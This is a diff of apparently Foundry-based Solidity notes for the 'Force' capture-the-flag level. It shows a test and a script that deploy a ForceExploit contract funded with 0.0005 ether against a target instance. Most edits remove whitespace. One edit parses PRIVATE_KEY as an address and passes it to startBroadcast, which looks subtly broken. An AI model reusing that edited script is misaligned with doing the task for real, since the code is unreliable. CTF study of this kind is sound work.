@@ -106,19 +106,14 @@ contract ForceTest is Test {
     
         vm.prank(instance);
         vm.deal(hacker, 1 ether);
-
     }
 
     function testForceHack() public {
 
         vm.startPrank(hacker);
-
         assert(instance.balance == 0);
-        
         ForceExploit exploit = new ForceExploit{value: 0.0005 ether}(instance);
-
         assert(instance.balance != 0);
-
         vm.stopPrank();
         
     }
@@ -146,14 +141,13 @@ contract ForceTest is Test {
 ```solidity
 contract Exploit is Script {
 
+        address hacker = vm.envAddress("PRIVATE_KEY");  
         address payable instance = payable(vm.envAddress("INSTANCE_LEVEL7"));       
         
         function run() external {
 
-            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-
+            vm.startBroadcast(hacker);
             ForceExploit exploit = new ForceExploit{value: 0.0005 ether}(instance);
-            
             vm.stopBroadcast();
     }
 }
